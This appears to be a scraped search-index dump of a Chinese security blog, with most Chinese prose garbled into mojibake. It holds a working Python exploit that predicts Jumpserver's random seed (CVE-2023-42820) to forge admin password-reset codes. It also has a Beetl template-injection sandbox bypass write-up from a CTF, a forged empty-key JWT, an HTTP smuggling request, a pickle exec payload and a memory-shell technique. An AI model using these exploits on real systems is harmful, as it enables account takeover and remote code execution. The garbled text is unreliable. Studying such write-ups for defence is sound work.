open(\u0026#39;./out/out.png\u0026#39;.format(str(i)), \u0026#39;wb\u0026#39;) f.write(res.content) f.close() except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) img = PIL.Image.open(\u0026#39;./out/out.png\u0026#39;) img.show() chal = input(\u0026#34;chal : \u0026#34;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) æ€è·¯ä¸‰ è‡ªåŠ¨æ ¡å‡†åç§»(ä¸å¯è¡Œ) æµç¨‹å¦‚ä¸‹ï¼š\nå…ˆè®¾ç½®seed1 è®¿é—®/core/auth/password/forget/previewing/è·¯ç”±åˆ·æ–°éªŒè¯ç ï¼Œæ­¤æ—¶seedå˜ä¸ºseed2ï¼Œchalç”±seed1ç”Ÿæˆã€‚ æšä¸¾ç”±seed1ç”Ÿæˆçš„chalçš„å››ç§å¯èƒ½ï¼Œé€‰æ‹©å¯èƒ½æ€§æœ€é«˜å°è¯•æäº¤formã€‚ä½¿ç”¨while å¾ªç¯é‡å¤1-3æ­¥éª¤ã€‚å¦‚æœéªŒè¯ç æ£€éªŒé€šè¿‡åˆ™breakã€‚ å¾ªç¯breakè¯´æ˜seed2å’Œchalå‡ç¡®å®šï¼Œæ­¤æ—¶å¯ä»¥å‡†ç¡®è®¡ç®—codeäº†ã€‚ éªŒè¯ç é€šè¿‡å°±ä»£è¡¨åç§»è®¾ç½®ä¸º4çš„æƒ…å†µç”Ÿæˆçš„chalæ˜¯æ­£ç¡®çš„ã€‚\næµç¨‹å›¾ï¼š æ­¤æ—¶å¯ä»¥çœ‹åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¦æ ¡å‡†seed2çš„åç§»å¿…é¡»è¦æäº¤formé€šè¿‡éªŒè¯ç æ£€éªŒï¼Œä½†ä¸Šæ–‡ä¸­çš„ä»£ç å®¡è®¡å¾—çŸ¥ï¼Œä¸€ä¸ªseedå¯¹åº”çš„chalä½¿ç”¨è¿‡ä¸€æ¬¡å°±ä¸èƒ½å†ç”¨äº†ï¼Œæ‰€ä»¥é‡æ–°è®¾ç½®seed2ä¼šå¤±è´¥ï¼Œè¿”å›410é”™è¯¯ï¼š\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) æ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸å¯è¡Œã€‚ä¸è¿‡è¿˜æ˜¯æŠŠè„šæœ¬è´´ä¸Šæ¥å§ï¼š\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, \u0026#34;*\u0026#34;)), str(eval(challenge)), ) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # æ²¡æœ‰åŒ…å«æŒ‡å®šçš„å­—ç¬¦, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # é¦–ä½ä¸èƒ½ä¸ºç‰¹æ®Šå­—ç¬¦, retry continue else: # æ»¡è¶³è¦æ±‚ç»ˆæ­¢ while å¾ªç¯ break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass def get_reset_page_1(s : requests.Session) -\u0026gt; tuple[str, str]: print(\u0026#34;[*] start to get captcha0\u0026#34;) res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) key_pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; csrf_token_pattern = r\u0026#39;name=\u0026#34;csrfmiddlewaretoken\u0026#34; value=\u0026#34;(.*)\u0026#34;\u0026#39; try: key = re.findall(key_pattern, res.text)[0] csrf_token = re.findall(csrf_token_pattern, res.text)[0] if len(key) == 40 and len(csrf_token) \u0026gt; 0: print(\u0026#34;[+] get captcha0 success\u0026#34;) return (key, csrf_token) except Exception as e: print(e) print(\u0026#34;[-] get captcha0 failed\u0026#34;) exit() def send_captcha(s : requests.Session, captcha_0 : str, captcha_1 : str, csrf_token : str) -\u0026gt; str: data = { \u0026#34;csrfmiddlewaretoken\u0026#34; : csrf_token, \u0026#34;username\u0026#34; : \u0026#34;admin\u0026#34;, \u0026#34;captcha_0\u0026#34; : captcha_0, \u0026#34;captcha_1\u0026#34; : captcha_1 } res = s.post(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;, data=data, allow_redirects=False) if res.status_code == 302: token = res.headers.get(\u0026#34;Location\u0026#34;).split(\u0026#34;token=\u0026#34;)[-1] if len(token) \u0026gt; 0: return token return None if __name__ == \u0026#39;__main__\u0026#39;: while True: key = None s = requests.session() set_seed(s) # set seed + gen_img_flow captcha0_key, captcha0_csrf_token = get_reset_page_1(s) random.seed(key) gen_img_flow(4) chal, answer = math_challenge() token = send_captcha(s, captcha0_key, str(answer), captcha0_csrf_token) if token != None: break else: print(\u0026#34;captcha incorrect\u0026#34;) key = captcha0_key set_seed(s) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) ","permalink":"https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/","summary":"ç¯å¢ƒ Jumpserver \u0026lt;= v3.6.4ä¸­å­˜åœ¨CVE-2023-42820æ¼æ´ï¼Œå¯ä»¥é¢„æµ‹éšæœºæ•°å¯¼è‡´éªŒè¯ç é¢„æµ‹ã€‚\nç¯å¢ƒæ­å»º\nvulnhubæˆ–è€…å®˜ç½‘\næ¼æ´åˆ†æ github diffå¦‚ä¸‹https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_stringå‡½æ•°ç”¨äºç”Ÿæˆå¯†ç é‡ç½®çš„éªŒè¯ç ï¼Œå»æ‰äº†randomçš„seedï¼Œæ‰€ä»¥ä»£ç ä¸­åº”è¯¥æœ‰åœ°æ–¹å¯ä»¥è®¾ç½®å¯æ§seedã€‚\njumpserver v3.6.4ä½¿ç”¨äº†django-simple-captcha v0.5.18æ¥ç”ŸæˆéªŒè¯ç ï¼Œè€Œæ­¤ç‰ˆæœ¬ä¸­åœ¨captcha_imageå‡½æ•°ä¸­è®¾ç½®äº†ç§å­ï¼Œä½†ç»“æŸåæœªå°†å…¶ç½®ç©ºã€‚\nå›¾ç‰‡éªŒè¯ç é€»è¾‘ captchaç›¸å…³è·¯ç”±å¦‚ä¸‹ï¼š\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] éªŒè¯ç åˆ·æ–°ä»£ç ï¼š\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.","title":"Jumpserveréšæœºæ•°é¢„æµ‹æ¼æ´(CVE-2023-42820)å¤ç°"},{"content":"æœ¬ç¯‡æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµå­¦ä¹ å’Œç ”ç©¶çš„ç›®çš„ï¼Œä¸¥ç¦ä½¿ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯ç”¨äºéæ³•ç›®çš„å’Œç ´åã€‚\nå‰è¨€ æ‹¿åˆ°äº†å‰æ®µæ—¶é—´ciscn 2024 finalçš„webé¢˜é™„ä»¶ï¼Œæ¥å¤ç°ä¸€ä¸‹Fobeeè¿™é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹beetlçš„æ¨¡æ¿æ³¨å…¥ã€‚\n3.15.xåŠä»¥å‰çš„ç‰ˆæœ¬ è¿‡æ»¤çš„å¾ˆå°‘ï¼Œéšä¾¿ç»•è¿‡ã€‚è´´å‡ ä¸ªå…¬å¼€çš„pocï¼š https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0æ˜¯é¢˜ç›®ä½¿ç”¨çš„ç‰ˆæœ¬ä¹Ÿæ˜¯æœ¬æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚\næµ‹è¯•ç¯å¢ƒä¸ºjava8u65ï¼Œ beetl 3.16.0ï¼Œ solon 2.8.5\nå…¥å£ @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } æ¸²æŸ“è¿‡ç¨‹ ç”±renderToè¿›å…¥executeå‡½æ•°ã€‚ç„¶åéå†æ‰€æœ‰è¦æ‰§è¡Œçš„è¯­å¥ç„¶åä¾æ¬¡æ‰§è¡Œã€‚ æ¯æ¡è¯­å¥çš„å…·ä½“æ‰§è¡Œä»£ç åœ¨org.beetl.core.statement.NativeCallExpression#evaluateå‡½æ•°ã€‚\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode != null) { targetObj = insNode.ref.evaluate(ctx); if (targetObj != null) { targetCls = targetObj.getClass(); } lastNode = insNode; } else { targetCls = ctx.gt.loadClassBySimpleName(this.clsNode.clazz); if (targetCls == null) { throw new BeetlException(BeetlException.NATIVE_CALL_EXCEPTION, \u0026#34;è¯¥ç±»ä¸å­˜åœ¨\u0026#34;) .pushToken(GrammarToken.createToken(clsNode.clazz, token.line)); } lastNode = clsNode; } for (NativeNode node : chain) { ... ... } else if (node instanceof NativeMethodNode) { NativeMethodNode methodNode = (NativeMethodNode) node; String method = methodNode.method; Expression[] expList = methodNode.params; this.checkPermit(ctx, targetCls, targetObj, method); Object[] args = expList.length == 0 ? ObjectUtil.EMPTY_OBJECT_ARRAY : new Object[expList.length]; Class[] parameterType = new Class[args.length]; for (int i = 0; i \u0026lt; expList.length; i++) { args[i] = expList[i].evaluate(ctx); parameterType[i] = args[i] == null ? null : args[i].getClass(); } this.checkNull(targetCls, lastNode); ObjectMethodMatchConf mf = ObjectUtil.findMethod(targetCls, method, parameterType); if (mf == null) { throw new BeetlException(BeetlParserException.NATIVE_CALL_INVALID, \u0026#34;æ ¹æ®å‚æ•°æœªæ‰¾åˆ°åŒ¹é…çš„æ–¹æ³•\u0026#34; + method + BeetlUtil.getParameterDescription(parameterType)) .pushToken(GrammarToken.createToken(token.text, token.line)); } if (targetObj == null \u0026amp;\u0026amp; !Modifier.isStatic(mf.method.getModifiers())) { throw new BeetlException(BeetlException.NULL) .pushToken(GrammarToken.createToken(token.text, token.line)); } try { if(mf.contextRequired){ ArrayList tempList = new ArrayList(Arrays.asList(args)); tempList.add(ctx); args = tempList.toArray(); } targetObj = ObjectUtil.invoke(targetObj, mf, args); targetCls = targetObj == null ? null : targetObj.getClass(); ... ... } lastNode = node; } return targetObj; } é»‘åå•ä¸»è¦é’ˆå¯¹æ–¹æ³•è°ƒç”¨ï¼Œå…¶ä»–ä»£ç çœç•¥ã€‚\nbeetlå°†æ¯æ¡è¯­å¥æ‹†åˆ†ä¸ºtargetClsï¼ŒtargetObjï¼Œmethodå’Œargsã€‚åœ¨org.beetl.core.DefaultNativeSecurityManager#permitå‡½æ•°ä¸­å¯¹targetClsè¿›è¡Œæ£€æŸ¥ï¼š\npublic boolean permit(Object resourceId, Class c, Object target, String method) { if (c.isArray()) { // å…è®¸è°ƒç”¨ï¼Œä½†å®é™…ä¸Šä¼šåœ¨åœ¨å…¶åè°ƒç”¨ä¸­æŠ¥é”™ã€‚ä¸å½’æ­¤å¤„ç®¡ç† return true; } String name = c.getName(); String className = null; String pkgName = null; int i = name.lastIndexOf(\u0026#39;.\u0026#39;); if (i != -1) { pkgName = name.substring(0, i); className = name.substring(i + 1); } else { // æ— åŒ…åï¼Œå…è®¸è°ƒç”¨ return true; } if (pkgName.startsWith(\u0026#34;java.lang.reflect\u0026#34;)) { //åå°„ç±»ï¼Œä¸å…è®¸è°ƒç”¨ https://gitee.com/xiandafu/beetl/issues/I8RU01 return false; } if (pkgName.startsWith(\u0026#34;java.lang\u0026#34;)) { return !className.equals(\u0026#34;Runtime\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Process\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;ProcessBuilder\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Thread\u0026#34;) // https://gitee.com/xiandafu/beetl/issues/I6RUIP \u0026amp;\u0026amp; !className.equals(\u0026#34;Class\u0026#34;) //https://gitee.com/xiandafu/beetl/issues/I6RUIP#note_17223442 \u0026amp;\u0026amp; !className.equals(\u0026#34;System\u0026#34;) ; } if(pkgName.startsWith(\u0026#34;java.beans\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I914H3#note_24939039 return false; } if(pkgName.startsWith(\u0026#34;org.beetl\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I6RUIP return false; } if(pkgName.startsWith(\u0026#34;javax.\u0026#34;)){ return false; } if(pkgName.startsWith(\u0026#34;sun.\u0026#34;)){ return false; } return true; } åœ¨æ­¤å¤„æ‰§è¡ŒgetRuntimeæ—¶targetClsä¸ºjava.lang.Runtimeï¼ŒpkgNameä½java.langï¼Œè¢«é™åˆ¶äº†ï¼Œcheckä¸é€šè¿‡ã€‚ å¦‚æœchecké€šè¿‡ï¼Œä¼šè§£æå‚æ•°å¹¶invokeå¯¹åº”å‡½æ•°ï¼š\ntargetObj = ObjectUtil.invoke(targetObj, mf, args); å‡ºç½‘åˆ©ç”¨ æ²¡åŠæ³•ç›´æ¥åˆ©ç”¨ï¼Œå°è¯•ä»solonå’Œbeetlä»£ç ä¸­æ‰¾æ‰¾å¯åˆ©ç”¨çš„ç±»ã€‚\norg.noear.solon.Utilsç±»ä¸­æœ‰ä¸¤ä¸ªé™æ€æ–¹æ³•ä¸åå°„æœ‰å…³ï¼š\npublic static Class\u0026lt;?\u0026gt; loadClass(String className) { return ClassUtil.loadClass(className); } public static \u0026lt;T\u0026gt; T newInstance(String className) { return ClassUtil.tryInstance(className); } é€šè¿‡è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥å®ä¾‹åŒ–ä»»æ„ç±»ã€‚\nJdbcRowSetImplæ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥å°è¯•jndiæ³¨å…¥ã€‚\nä¸å‡ºç½‘åˆ©ç”¨ newInstanceéƒ¨åˆ†ç»•è¿‡äº†ï¼Œè¿˜å·®invokeéƒ¨åˆ†ã€‚\norg.noear.solon.core.wrap.MethodWrapç±»ä¸­å®ç°äº†invokeåŠŸèƒ½ï¼š\npublic Object invoke(Object obj, Object[] args) throws Throwable { try { return method.invoke(obj, args); } catch (InvocationTargetException e) { Throwable e2 = e.getTargetException(); throw Utils.throwableUnwrap(e2); } } org.noear.solon.core.AppContext#methodGetä¼šå¯¹methodè¿›è¡ŒåŒ…è£…ï¼š\npublic MethodWrap methodGet(Method method) { MethodWrap mw = methodCached.get(method); if (mw == null) { SYNC_LOCK.lock(); try { mw = methodCached.get(method); if (mw == null) { mw = new MethodWrap(this, method); methodCached.put(method, mw); } } finally { SYNC_LOCK.unlock(); } } return mw; } @org.noear.solon.Solon.app().context()å¯ä»¥è·å–ä¸Šä¸‹æ–‡ï¼Œä¹Ÿå°±æ˜¯Appcontextå¯¹è±¡ã€‚\nè¦åŒ…è£…å‡½æ•°éœ€è¦å…ˆè·å¾—Methodå¯¹è±¡ã€‚ org.noear.solon.core.util.ReflectUtil#getDeclaredMethodså¯ä»¥è·å¾—æ‰€æœ‰å£°æ˜æ–¹æ³•ã€‚\npublic static Method[] getDeclaredMethods(Class\u0026lt;?\u0026gt; clazz) { return global.getDeclaredMethods(clazz); } è¿™æ ·å°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„publicå‡½æ•°äº†ã€‚\nå›æ˜¾ org.noear.solon.core.handle.ContextUtil#currentå¯è·å–å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œè¿™é‡Œçš„contextå’Œappcontextä¸ä¸€æ ·ï¼Œæ­¤å¤„çš„contextåªåŒ…å«æœ¬æ¬¡è¯·æ±‚çš„è¯·æ±‚åŒ…å’Œè¿”å›åŒ…ç­‰å†…å®¹ã€‚\npublic static Context current(){ Context tmp = threadLocal.get(); if (tmp == null \u0026amp;\u0026amp; Solon.cfg().testing()) { tmp = new ContextEmpty(); threadLocal.set(tmp); } return tmp; } solonä½¿ç”¨çš„æ˜¯smarthttpã€‚smhttpctxå¯¹è±¡æœ‰ä¸€ä¸ªoutputå‡½æ•°ç”¨æ¥å‘è¿”å›åŒ…å†™æ•°æ®ã€‚ org.noear.solon.boot.smarthttp.http.SmHttpContext#output\npublic void output(byte[] bytes) { try { OutputStream out = this.outputStream(); if (this._allows_write) { out.write(bytes); } } catch (Throwable var3) { throw new RuntimeException(var3); } } å°†æ•°æ®å†™å…¥byte[]ä¸­å†ä»£ç”¨outputå°±å¯ä»¥å›æ˜¾äº†ã€‚ getInputStream()è·å¾—æ‰§è¡Œç»“æœçš„inputstreamå¯¹è±¡ï¼Œbyte[]å¯¹è±¡é€šè¿‡åå°„Arrayè·å¾—ã€‚\nç»“å°¾ ç›®å‰beetlçš„3.17.0ç‰ˆæœ¬å·²ç»é»˜è®¤ä½¿ç”¨ç™½åå•æ¨¡å¼ é“¾æ¥\n","permalink":"https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/","summary":"æœ¬ç¯‡æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµå­¦ä¹ å’Œç ”ç©¶çš„ç›®çš„ï¼Œä¸¥ç¦ä½¿ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯ç”¨äºéæ³•ç›®çš„å’Œç ´åã€‚\nå‰è¨€ æ‹¿åˆ°äº†å‰æ®µæ—¶é—´ciscn 2024 finalçš„webé¢˜é™„ä»¶ï¼Œæ¥å¤ç°ä¸€ä¸‹Fobeeè¿™é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹beetlçš„æ¨¡æ¿æ³¨å…¥ã€‚\n3.15.xåŠä»¥å‰çš„ç‰ˆæœ¬ è¿‡æ»¤çš„å¾ˆå°‘ï¼Œéšä¾¿ç»•è¿‡ã€‚è´´å‡ ä¸ªå…¬å¼€çš„pocï¼š https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0æ˜¯é¢˜ç›®ä½¿ç”¨çš„ç‰ˆæœ¬ä¹Ÿæ˜¯æœ¬æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚\næµ‹è¯•ç¯å¢ƒä¸ºjava8u65ï¼Œ beetl 3.16.0ï¼Œ solon 2.8.5\nå…¥å£ @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } æ¸²æŸ“è¿‡ç¨‹ ç”±renderToè¿›å…¥executeå‡½æ•°ã€‚ç„¶åéå†æ‰€æœ‰è¦æ‰§è¡Œçš„è¯­å¥ç„¶åä¾æ¬¡æ‰§è¡Œã€‚ æ¯æ¡è¯­å¥çš„å…·ä½“æ‰§è¡Œä»£ç åœ¨org.beetl.core.statement.NativeCallExpression#evaluateå‡½æ•°ã€‚\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode !","title":"Ciscn 2024 final Fobee wp"},{"content":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==\n","permalink":"https://zoiltin.github.io/about/","summary":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==","title":"About"},{"content":"d3pythonhttp è§£å†³ï¼Œä¸€è¡€\njwtç»•è¿‡ def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False éªŒè¯jwtæ—¶kidæ§åˆ¶å¯†é’¥æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœè®¾ç½®çš„å¯†é’¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™keyä¸ºç©ºï¼Œæ‰€ä»¥æ„é€ ç©ºç§˜é’¥ä»¥åŠä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å³å¯ï¼š\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M è§£æå·®å¼‚ ä¸€ç§åšæ³•æ˜¯TE-CLè¯·æ±‚èµ°ç§ã€‚ä¸è¿‡æˆ‘ç”¨çš„æ˜¯å¦ä¸€ç§åŠæ³•ï¼šå‰ç«¯ä½¿ç”¨Flaskï¼Œåç«¯ä½¿ç”¨web.pyå­˜åœ¨è§£æå·®å¼‚ã€‚ ç»æµ‹è¯•å‘ç°ï¼šå‰æ®µå¯¹äºchunkedä¸åˆ†å¤§å°å†™ï¼Œåç«¯ä¼šåŒºåˆ†ã€‚å‰ç«¯åªè¿›è¡Œåˆ†å—ä¼ è¾“ï¼Œå¿½ç•¥Content-Lengthã€‚è€Œåç«¯ä¼šå…ˆåˆ†å—ï¼Œå†æ ¹æ®Content-Lengthæˆªå–ï¼Œå‰ç«¯ä¼šæŠŠContent-Lengthç›´æ¥å‘é€ç»™åç«¯ã€‚\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} é™¤äº†Hostä»¥å¤–çš„headeréƒ½å‘å¾€åç«¯äº†åŒ…æ‹¬Content-Lengthï¼Œä¸”å‰ç«¯ä¸è¿›è¡Œè®¡ç®—éªŒè¯ã€‚ æ•°æ®åŒ…ï¼š\nPOST /admin HTTP/1.1 Host: 192.168.72.137:8081 Content-Length: 192 Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M Transfer-Encoding: chunKed dc \u0026lt;base64payload...é•¿åº¦ä¸º192\u0026gt;BackdoorPasswordOnlyForAdmin 0 åç«¯åªè¯»å–å‰192ä¸ªå­—ç¬¦ï¼Œåé¢çš„BackdoorPasswordOnlyForAdminè¢«èˆå¼ƒã€‚ç»•è¿‡ã€‚ base64è§£ç åpickleååºåˆ—åŒ–ã€‚\nimport pickle import os import base64 payload = \u0026#34;\u0026#34;\u0026#34; print(1) \u0026#34;\u0026#34;\u0026#34; class test: def __reduce__(self): return (exec,(payload,)) a = test() b = base64.b64encode(pickle.dumps(a)) print(b) çªç ´å†…ç½‘ é¢˜ç›®ä¸å‡ºç½‘ï¼Œå¯ä»¥è¯•è¯•æ•´ä¸ªç±»ä¼¼å†…å­˜é©¬çš„ä¸œè¥¿ï¼ˆä»dubhe ctf 2024ä¸­å­¦åˆ°çš„ï¼‰ã€‚ åç«¯å­˜åœ¨ä»¥ä¸‹è·¯ç”±ï¼š\nurls = ( \u0026#39;/\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;/backdoor\u0026#39;, \u0026#39;backdoor\u0026#39; ) web.config.debug = False app = web.application(urls, globals()) class index: def GET(self): return \u0026#34;welcome to the backend!\u0026#34; å¯¹åº”å‰ç«¯ä»£ç ï¼š\n@app.route(\u0026#39;/backend\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def proxy_to_backend(): forward_url = \u0026#34;python-backend:8080\u0026#34; conn = http.client.HTTPConnection(forward_url) method = request.method headers = {key: value for (key, value) in request.headers if key != \u0026#34;Host\u0026#34;} data = request.data path = \u0026#34;/\u0026#34; if request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() conn.request(method, path, body=data, headers=headers) response = conn.getresponse() return response.read() response = conn.getresponse() è¿™æ®µä»£ç æ„å‘³ç€åç«¯å¤„ç†çš„æ•°æ®åä¼šå›æ˜¾åˆ°å‰ç«¯ï¼Œè€Œ/backdoorè·¯ç”±ä¸ä¼šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†åç«¯indexè·¯ç”±è¦†ç›–ä¸ºå†…å­˜é©¬ã€‚ ä½¿ç”¨execå‡½æ•°æ‰§è¡Œä»¥ä¸‹pythonä»£ç å°±å¯ä»¥å°†indexè·¯ç”±çš„GETæ–¹æ³•è¦†ç›–(asdå‚æ•°è¦ä¿ç•™ï¼Œå› 